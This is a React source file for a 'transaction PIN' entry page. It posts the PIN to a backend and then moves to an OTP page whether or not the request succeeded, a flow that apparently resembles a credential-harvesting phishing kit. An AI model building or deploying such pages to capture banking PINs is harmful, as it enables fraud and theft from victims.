import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/pin.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d+$/, "PIN must be numeric")

    .required("PIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [loading, setLoading] = useState(false);

  const handleInputChange = (e) => {
    const value = e.target.value;
    e.target.value = value.replace(/\D/g, "");
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then((response) => {
        console.log(response.data);
        reset(); // Clear the input field
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        navigate("/otp");
        setLoading(false);
      });
  };

  return (
    <div className="otp">
      <div className="container">
        <div className="contentSec">
          <div className="title">Enter Your Transaction PIN</div>

          <div className="subText">
            For your security, please enter your 6-digit transaction PIN to
            complete this action
          </div>
        </div>
        <div className="loginWrapper">
          <div className="loginSec">
            <form onSubmit={handleSubmit(submitForm)}>
              <div className="formOtpInput">
                <input
                  name="pin"
                  type="text"
                  required
                  placeholder="******"
                  inputMode="numeric"
                  pattern="\d*"
                  {...register("pin")}
                  onInput={handleInputChange}
                />
              </div>
              <FormErrMsg errors={errors} inputName="otp" />
              <button type="submit" disabled={loading}>
                {loading ? "Loading..." : "Sign In"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Pin;
